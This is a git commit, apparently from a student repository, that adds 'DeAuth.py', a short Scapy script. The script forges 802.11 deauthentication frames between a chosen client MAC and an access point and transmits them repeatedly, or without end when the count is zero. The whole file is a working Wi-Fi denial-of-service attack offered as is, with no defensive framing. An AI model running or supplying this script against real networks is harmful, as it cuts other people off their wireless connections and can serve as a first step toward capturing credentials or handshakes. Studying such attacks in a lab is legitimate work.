4408dfc9456998802d96dd18910e370dcd9c5736
Dodecahedra <k.degeling@student.tue.nl>
2019-03-15 12:00:15 +0100

    Deauth Attack

---
+++ DeAuth.py
@@ -0,0 +1,18 @@
+from scapy.all import *
+
+count = sys.argv[1] #Amount of DeAuth's to send
+targetMAC = sys.argv[2] #Target MAC Address
+APMAC = sys.argv[3] #Access Point MAC Address
+iface = sys.argv[4]
+
+#Constructing DeAuth message
+deauth = RadioTap()/Dot11(
+            type=0, subtype=12, addr1=targetMAC, addr2=APMAC, addr3=APMAC)/Dot11Deauth(
+                reason=7)
+
+for i in range(int(count)):
+    sendp(deauth, iface=iface)
+
+if int(count)==0:
+    while True:
+        sendp(deauth, iface=iface)
